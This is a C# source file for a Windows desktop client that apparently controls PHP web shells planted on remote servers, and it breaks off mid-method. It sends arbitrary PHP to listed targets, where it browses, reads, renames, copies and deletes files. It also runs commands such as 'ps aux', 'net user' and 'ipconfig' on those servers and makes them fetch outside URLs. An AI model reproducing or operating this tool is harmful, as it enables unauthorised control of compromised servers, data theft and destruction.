using System;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Collections;
using System.Collections.Generic;
using System.Web;
using System.Text.RegularExpressions;
using System.Threading;
using System.Linq;

namespace bantam_php
{
    public partial class BantamMain : Form
    {

        /// <summary>
        /// 
        /// </summary>
        public const string CONFIG_FILE = "bantam.xml";

        /// <summary>
        /// 
        /// </summary>
        public string target;

        /// <summary>
        /// 
        /// </summary>
        public Dictionary<string, ClientInfo> Clients = new Dictionary<string, ClientInfo>();

        /// <summary>
        /// Main Form Constructor, performs the initialization routine, and requests some basic information about every server provided
        /// through the XML, then puts them into the gui
        /// </summary>
        public BantamMain()
        {
            InitializeComponent();

            //check if config file exists, proceed to load it and select the "servers" into an XmlNodeList
            if (File.Exists(CONFIG_FILE))
            {
                XmlDocument xmlDoc = new XmlDocument();
                xmlDoc.Load(CONFIG_FILE);

                XmlNodeList itemNodes = xmlDoc.SelectNodes("//servers/server");

                if (itemNodes.Count > 0)
                {
                    //loop through every server
                    foreach (XmlNode itemNode in itemNodes)
                    {
                        //Hot select target onload up
                        string host = itemNode.Attributes["host"].Value;

                        //add the host to our client class containing infos
                        Clients.Add(host, new ClientInfo());

                        //execute ping on current host iteration
                        Thread t = new Thread(getInitDataThread);
                        t.Start(host);
                    }
                }
            } 
            else
            {
                MessageBox.Show("Config file (" + CONFIG_FILE + ") is missing.", "Oh... Shied..");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public bool validTarget()
        {
            if (string.IsNullOrEmpty(target) == false)
            {
                if (Clients[target].Down == false)
                {
                    return true;
                }
            }
            return false;
        }

        //These are called/invoked when a thread needs to modify a UI element that exists in the main thread.
        #region THREAD_SAFE_GUI_CALLBACKS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="title"></param>
        /// <param name="text"></param>
        public delegate void guiHelperRichTextboxPromptDelegate(string title, string text);
        public void guiHelperRichTextBoxPromptMethod(string title, string text)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiHelperRichTextboxPromptDelegate(guiHelperRichTextBoxPromptMethod), new Object[] { title, text });
                return;
            }
            GUI_Helper.Prompt.RichTextBoxDialog(title, text);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="host"></param>
        /// <param name="pingMS"></param>
        /// <param name="windows"></param>
        public delegate void addClientDelegate(string host, string pingMS);
        public void addClientMethod(string host, string pingMS)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new addClientDelegate(addClientMethod), new Object[] { host, pingMS });
                return;
            }

            //add them to our listview
            //TODO either do not add them to the listview or add them add red with a NA ping, and the ability to re-ping (fix) them
            if (pingMS == "-")
            {
                listViewClients.Items.Add(new ListViewItem(new string[] { host, pingMS }));
                int lastIndex = listViewClients.Items.Count - 1;
                listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;

                Clients[host].Down = true;
            }
            else
            {
                listViewClients.Items.Add(new ListViewItem(new string[] { host, pingMS + " ms" }));
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void guiCallbackUpdateListViewItemDelegate(object arg = null);
        public void guiCallbackUpdateListViewItemPing(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackUpdateListViewItemDelegate(guiCallbackUpdateListViewItemPing), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;

                ListViewItem lvi = (ListViewItem)objects[0];
                string multithreadSafeTarget = (string)objects[1];

                lvi.SubItems[1].Text = Clients[multithreadSafeTarget].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                Clients[multithreadSafeTarget].PingStopwatch.Stop();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void guiCallbackBrowserViewDelegate(object arg = null);
        public void guiCallbackBrowserViewMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackBrowserViewDelegate(guiCallbackBrowserViewMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    BrowserView broView = new BrowserView(result, 1000, 1000);
                    broView.Show();
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserWindowsStartDelegate(object arg = null);
        public void fileBrowserWindowsStartMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserWindowsStartDelegate(fileBrowserWindowsStartMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] drives = { null };
                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0)
                    {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives)
                        {
                            treeViewFileBrowser.Nodes.Add("", drive, 3);
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserLinuxStartDelegate(object arg = null);
        public void fileBrowserLinuxStartMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserLinuxStartDelegate(fileBrowserLinuxStartMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] rows = result.Split(new string[] { PHP_Helper.rowSeperator }, StringSplitOptions.None);

                    if (rows.Length > 0 && rows != null)
                    {
                        foreach (string row in rows)
                        {
                            string[] columns = row.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);

                            if (columns != null && columns.Length - 2 > 0)
                            {
                                if (columns[columns.Length - 2] == "dir")
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == target)
                                    {
                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                    else
                                    {
                                        //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
                                        TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                }
                                else
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == target)
                                    {
                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                    else
                                    {
                                        //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
                                        TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserBtnGoClickDelegate(object arg = null);
        public void fileBrowserBtnGoClickMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserBtnGoClickDelegate(fileBrowserBtnGoClickMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(hostTarget) == false)
                {
                    //Clear preview treeview data
                    Clients[hostTarget].Files.Nodes.Clear();

                    //if user didn't switch targets by the time this callback is triggered clear the live treeview
                    if (target == hostTarget)
                    {
                        treeViewFileBrowser.Nodes.Clear();
                        treeViewFileBrowser.Refresh();
                    }

                    //set path
                    string path = txtBoxFileBrowserPath?.Text;
                    if (string.IsNullOrEmpty(path))
                    {
                        path = ".";
                    }

                    if (result != null && result.Length > 0)
                    {
                        string[] rows = result.Split(new string[] { PHP_Helper.rowSeperator }, StringSplitOptions.None);

                        if (rows.Length > 0 && rows != null)
                        {
                            foreach (string row in rows)
                            {
                                string[] columns = row.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);

                                if (columns != null && columns.Length - 2 > 0)
                                {
                                    if (columns[columns.Length - 2] == "dir")
                                    {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (target == hostTarget)
                                        {
                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                        else
                                        {
                                            //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
                                            TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                    }
                                    else
                                    {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (target == hostTarget)
                                        {
                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        } 
                                        else
                                        {
                                            //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
                                            TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserMouseClickDelegate(object arg = null);
        public void fileBrowserMouseClickMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserMouseClickDelegate(fileBrowserMouseClickMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                TreeNode tn = (TreeNode)objects[1];
                string result = (string)objects[2];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] rows = result.Split(new string[] { PHP_Helper.rowSeperator }, StringSplitOptions.None);

                    if (rows.Length > 0 && rows != null)
                    {
                        foreach (string row in rows)
                        {
                            string[] columns = row.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);

                            if (columns != null && columns.Length - 2 > 0)
                            {
                                if (columns[columns.Length - 2] == "dir")
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == target)
                                    {
                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                    else
                                    {
                                        //TODO update their client cache here user changed clients
                                    }
                                }
                                else
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == target)
                                    {
                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                    else
                                    {
                                        //TODO update their client cache here user changed clients
                                    }
                                }
                            }
                            else
                            {
                                //MessageBox.Show(columns[0]);
                            }
                        }
                        tn.Expand();
                    }
                }
            }
        }

        #endregion

        #region REQUEST_THREADS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="target"></param>
        /// <param name="code"></param>
        /// <param name="title"></param>
        public void startRichTextBoxThread(string code, string title)
        {
            if (validTarget() == false)
            {
                return;
            }

            Thread t = new Thread(this.richTextboxDialogThread);
            t.Start(new string[] { target, code, title });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="data"></param>
        public void richTextboxDialogThread(object data)
        {
            if (data is Array && ((Array)data).Length == 3)
            {
                string[] requestData = (string[])data;
                string resultTxt = executePHP((string)requestData[0], (string)requestData[1]);

                if (string.IsNullOrEmpty(resultTxt) == false)
                {
                    GUI_Helper.Prompt.RichTextBoxDialog((string)requestData[2], resultTxt);
                }
                else
                {
                    //TODO if (cfg messageboxes)
                    MessageBox.Show("No Data Returned", "Welp...");
                }
            }
            else
            {
                MessageBox.Show("Invalid Argument Count - richTextboxDialogThread", "ERROR");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public void getInitDataThread(object host)
        {
            if (string.IsNullOrEmpty(host.ToString()) == false)
            {
                //start stopwatch for ping/estimated average response time
                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                string result = executePHP((string)host, PHP_Helper.initDataVars);

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] data = { null };
                    data = result.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);

                    var initDataReturnedVarCount = Enum.GetValues(typeof(PHP_Helper.INIT_DATA_VARS)).Cast<PHP_Helper.INIT_DATA_VARS>().Max();

                    if (data != null && data.Length == (int)initDataReturnedVarCount + 1)
                    {
                        //invokes a thread safe call from the GUI thread so we can safely update the GUI's listview
                        addClientMethod((string)host, pingWatch.ElapsedMilliseconds.ToString());

                        //add clients info to our local data handler
                        Clients[(string)host].update(pingWatch.ElapsedMilliseconds, data);
                    }
                    else
                    {
                        addClientMethod((string)host, "-");
                    }
                }
                else
                {
                    addClientMethod((string)host, "-");
                }
                pingWatch.Stop();
            }
        }

        //delegate, with dynmaic thread safe GUI callback ::O
        /// <summary>
        /// 
        /// </summary>
        /// <param name="args"></param>
        public void dynamicRequestThread(object args)
        {
            if (args != null)
            {
                //cast the args to our defined class
                DynamicThreadArgs wrapperArgs = (DynamicThreadArgs)args;

                //execute our request in our threads that runs asynchronously along side the GUI thread
                string result = executePHP(wrapperArgs.target, wrapperArgs.code);

                if (string.IsNullOrEmpty(result) == false)
                {
                    if (wrapperArgs.callbackArgs != null && wrapperArgs.callbackArgs.Length > 0)
                    {
                        //TODO: fix these 3 ghetto lines of a hack used to put the result of the request into the existing wrapper callback args
                        object[] tmpCallbackArgs = wrapperArgs.callbackArgs;
                        Array.Resize(ref tmpCallbackArgs, wrapperArgs.callbackArgs.Length + 1);
                        tmpCallbackArgs[wrapperArgs.callbackArgs.Length] = result;

                        //Invoke the dynamic thread safe callback, with it's "object" of arguments
                        wrapperArgs.callback?.Invoke(tmpCallbackArgs);
                    }
                }
            }
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// Displays and copies your local IPV4 address
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void getMyIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string remoteIP = this.makeRequest("http://ipv4.icanhazip.com/", "");

            if (string.IsNullOrEmpty(remoteIP) == false)
            {
                MessageBox.Show(remoteIP, "Your IP Is");
                Clipboard.SetText(remoteIP);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            ListViewItem lvi = GUI_Helper.GetFirstSelectedListview(listViewClients);

            if (lvi != null
            && (Clients[target].PingStopwatch == null || Clients[target].PingStopwatch.IsRunning == false))
            {
                //start client stopwatch
                Clients[target].PingStopwatch = new Stopwatch();
                Clients[target].PingStopwatch.Start();

                //setup main thread
                DynamicThreadArgs threadArgs = DynamicThreadArgs.GetThreadArgs(target, "echo '1';", new object[] { lvi, target }, guiCallbackUpdateListViewItemPing);

                //start main thread
                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
                t.Start((object)threadArgs);
            }
        }

        //TODO low priority make the redtube a editable link
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void unameaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            //setup main thread
            DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, PHP_Helper.getBasicCurl("http://redtube.com/"), guiCallbackBrowserViewMethod, new object[] { target });

            //start main thread
            Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
            t.Start((object)threadArgs);
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            //setup main thread
            DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, "phpinfo();", guiCallbackBrowserViewMethod, new object[] { target });

            //start main thread
            Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
            t.Start((object)threadArgs);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabPageFiles_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GUI_Helper.GetFirstSelectedListview(listViewClients);
            if (lvi != null)
            {
                //copy a backup of the current file tree view into clients
                if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0)
                {
                    //Clear previously cached treeview to only store 1 copy
                    if (!string.IsNullOrEmpty(target) && Clients[target].Files.Nodes.Count > 0)
                    {
                        Clients[target].Files.Nodes.Clear();
                    }
                    //store current treeview into client and clear
                    GUI_Helper.CopyNodes(treeViewFileBrowser, Clients[target].Files);
                    treeViewFileBrowser.Nodes.Clear();
                }

                target = lvi.SubItems[0].Text;

                //TODO: investigate - new possible issue
                if (validTarget() == false)
                {
                    //clear the ui of invalid data
                    lblDynCWD.Text = "";
                    lblDynFreeSpace.Text = "";
                    lblDynHDDSpace.Text = "";
                    lblDynServerIP.Text = "";
                    lblDynUname.Text = "";
                    lblDynUser.Text = "";
                    lblDynWebServer.Text = "";
                    lblDynGroup.Text = "";
                    lblDynPHP.Text = "";
                    txtBoxFileBrowserPath.Text = "";
                    return;
                }

                lblDynCWD.Text = Clients[target].CWD;
                lblDynFreeSpace.Text = !string.IsNullOrEmpty(Clients[target].FreeHDDSpace) ? GUI_Helper.FormatBytes(Convert.ToDouble(Clients[target].FreeHDDSpace)) : "0";
                lblDynHDDSpace.Text = !string.IsNullOrEmpty(Clients[target].TotalHDDSpace) ? GUI_Helper.FormatBytes(Convert.ToDouble(Clients[target].TotalHDDSpace)) : "0";
                lblDynServerIP.Text = Clients[target].IP;
                lblDynUname.Text = Clients[target].UnameRelease + " " + Clients[target].UnameKernel;
                lblDynUser.Text = Clients[target].UID + " ( " + Clients[target].User + " )";
                lblDynWebServer.Text = Clients[target].ServerSoftware;
                lblDynGroup.Text = Clients[target].GID + " ( " + Clients[target].Group + " )";
                lblDynPHP.Text = Clients[target].PHP_Version;

                if (tabControl1.SelectedTab == tabPageFiles)
                {
                    if (Clients[target].Files.Nodes != null
                    && Clients[target].Files.Nodes.Count > 0)
                    {
                        GUI_Helper.CopyNodes(Clients[target].Files, treeViewFileBrowser);
                        treeViewFileBrowser.Refresh();
                        treeViewFileBrowser.ExpandAll();
                    }
                    else
                    {
                        start_FileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (tabControl1.SelectedTab == tabPageFiles)
            {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes.Count == 0 
                && Clients[target].Files.Nodes != null
                && Clients[target].Files.Nodes.Count > 0)
                {
                    //populate the treeview from cache
                    GUI_Helper.CopyNodes(Clients[target].Files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();
                }
                else
                {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0)
                    {
                        start_FileBrowser();
                    }
                }
            }
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// 
        /// </summary>
        private void start_FileBrowser()
        {
            if (validTarget() == false)
            {
                return;
            }

            txtBoxFileBrowserPath.Text = Clients[target].CWD;
            if (Clients[target].Windows)
            {
                //setup main thread
                DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, PHP_Helper.phpGetDrivesCode, fileBrowserWindowsStartMethod, new object[] { target });

                //start main thread
                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
                t.Start((object)threadArgs);
            }
            else
            {
                string directoryContentsPHPCode = PHP_Helper.getDirectoryEnumerationCode(".", Clients[target].PHP_Version);

                //setup main thread
                DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, directoryContentsPHPCode, fileBrowserLinuxStartMethod, new object[] { target });

                //start main thread
                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
                t.Start((object)threadArgs);
            }

            if (tabControl1.SelectedTab != tabPageFiles)
            {
                tabControl1.SelectedTab = tabPageFiles;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            start_FileBrowser();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0)
            {
                //replace backslash from the treenode path to a proper forward slash
                string path = tn.FullPath.Replace('\\', '/');
                //Get Directory Contents PHP code
                string directoryContentsPHPCode = PHP_Helper.getDirectoryEnumerationCode(path, Clients[target].PHP_Version);

                //attempts to execute the directoryContents PHP code on the "target"

                //setup GUI callback to call after request
                //setup main thread
                DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, directoryContentsPHPCode, fileBrowserMouseClickMethod, new object[] { target, tn });

                //start main thread
                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
                t.Start((object)threadArgs);
            }
        }

        //TODO Cleanup later, find another way to do this or disable the flashing

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0)
            {
                Clients[target].Files.Nodes.Clear();
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            start_FileBrowser();
        }


        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null)
            {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            string code = "@readfile('" + path + "');";
            startRichTextBoxThread(code, "Viewing File -" + path);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            string path = treeViewFileBrowser.SelectedNode.Parent.FullPath.Replace('\\', '/');
            string newFileName = GUI_Helper.Prompt.RenameFileDialog(fileName, "Renaming File");

            if (newFileName != "")
            {
                string newFile = path + '/' + newFileName;
                string code = "@rename('" + fileName + "', '" + newFile + "');";

                //start main thread
                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
                t.Start((object)new DynamicThreadArgs(target, code));
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", "HOLD ON THERE COWBOY", MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes)
            {
                string code = "@unlink('" + path + "');";

                //start main thread
                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
                t.Start((object)new DynamicThreadArgs(target, code));
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            string path = treeViewFileBrowser.SelectedNode.Parent.FullPath.Replace('\\', '/');
            string newFileName = GUI_Helper.Prompt.RenameFileDialog(fileName, "Copying File");

            if (newFileName != "")
            {
                string newFile = path + '/' + newFileName;
                string code = "@copy('" + fileName + "', '" + newFile + "');";

                //start main thread
                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
                t.Start((object)new DynamicThreadArgs(target, code));
            }
        }

        /// <summary>
        /// Change filebrowser directory and refresh the view
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnFilesBrowserGo_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
            {
                return;
            }

            string directoryContentsPHPCode = PHP_Helper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Clients[target].PHP_Version);

            //setup main thread
            DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, directoryContentsPHPCode, fileBrowserBtnGoClickMethod, new object[] { target });

            //start main thread
            Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
            t.Start((object)threadArgs);
        }

        #endregion

        #region OS_COMMANDS

        /// <summary>
        /// Shows process list inside of a read-only richtext editor
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            //default to linux, override to windows if needed
            string code = "@system('ps aux');";
            if (Clients[target].Windows)
            {
                code = "@system('tasklist');";
            }

            startRichTextBoxThread(code, "Process List");
        }

        //Triggered via MENU_ITEM_CLICK

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows)
            {
                string code = "@system('net user');";
                startRichTextBoxThread(code, "User Account");
            }
            else
            {
                MessageBox.Show("This client is linux!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows)
            {
                string code = "@system('net accounts');";
                startRichTextBoxThread(code, "User Accounts");
            }
            else
            {
                MessageBox.Show("This client is linux!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows)
            {
                string code = "@system('ipconfig');";
                startRichTextBoxThread(code, "ipconfig");
            }
            else
            {
                MessageBox.Show("This client is linux!", "DERP!!");
